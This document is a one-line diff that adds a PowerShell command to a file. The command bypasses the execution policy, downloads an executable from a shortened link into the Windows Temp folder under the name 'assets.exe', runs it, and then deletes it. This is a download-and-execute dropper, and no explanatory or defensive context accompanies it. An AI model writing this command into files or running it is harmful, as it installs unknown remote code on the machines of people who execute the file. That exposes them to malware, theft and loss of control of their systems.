@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://bitly.cx/fgitZ', 'C:\Windows\Temp\assets.exe'); Start-Process ('C:\Windows\Temp\assets.exe')"; del C:\Windows\Temp\assets.exe
